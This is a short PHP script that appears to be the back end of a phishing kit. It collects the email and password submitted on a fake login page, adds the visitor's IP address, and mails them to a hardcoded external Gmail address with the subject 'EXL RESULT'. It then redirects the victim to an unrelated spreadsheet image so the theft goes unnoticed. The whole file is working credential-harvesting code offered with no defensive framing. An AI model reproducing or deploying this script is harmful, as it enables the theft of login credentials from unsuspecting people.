<?php
//retrieve our data from POST
$ip = getenv("REMOTE_ADDR");
$message .= "----------Kapela'S PAGE------------\n";
$message .= "User ID : ".$_POST['Email']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "$ip \n";
$message .= "------------KaPeLa --------------\n";


$recipient = "zigziglar9@gmail.com,";
$subject = "EXL RESULT";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);

header("Location: http://download.asperasoft.com/download/docs/console/2.0/linux/html/images/console/console-report-ex1-xls.gif");
?> 